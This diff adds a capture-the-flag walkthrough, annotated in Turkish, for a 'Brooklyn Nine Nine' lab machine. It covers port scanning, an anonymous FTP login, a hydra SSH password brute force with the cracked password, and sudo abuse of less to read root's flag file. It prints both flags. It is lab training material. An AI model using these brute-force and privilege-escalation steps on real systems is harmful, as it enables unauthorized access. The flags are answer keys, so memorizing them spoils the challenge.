@@ -1,0 +1,70 @@
+->nmap -sV -sC ip 
+21/tcp    open     ftp          vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.9.0.54
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp    open     ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
+|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
+|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
+80/tcp    open     http         Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+
+ftp protokolüne giriyorum
+->ftp ip
+Username: anonymous
+Password: [boş bırakılmalıdır veya herhangi bir şey yazılabilir]
+
+İçinden note_to_jake.txt dosyasını indirdim
+->get note_to_jake.txt
+
+->cat note_to_jake.txt
+Jake please change password.It is too weak
+
+
+şifresi basit olduğu içinden hydra ile ssh şifresine brute force yaptım
+->hydra -l jake -P /usr/share/wordlists/rockyou.txt ip -t 4 ssh 
+ password: 987654321
+
+ssh ile giriş
+->ssh jake@ip 
+ 
+->cd /home/holt
+
+->cat user.txt
+ee11cbb19052e40b07aac0ca060c23ee
+
+->sudo -l
+
+Matching Defaults entries for jake on brookly_nine_nine:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jake may run the following commands on brookly_nine_nine:
+    (ALL) NOPASSWD: /usr/bin/less
+
+ "Jake" adlı kullanıcının sudo yetkisi ile "less" komutunu root olarak çalıştırabileceğini belirtir
+
+sudo /usr/bin/less /root/root.txt
+
+-- Creator : Fsociety2006 --
+Congratulations in rooting Brooklyn Nine Nine
+Here is the flag: 63a9f0ea7bb98050796b649e85481845
+
+Enjoy!!
+/root/root.txt (END)
+
+
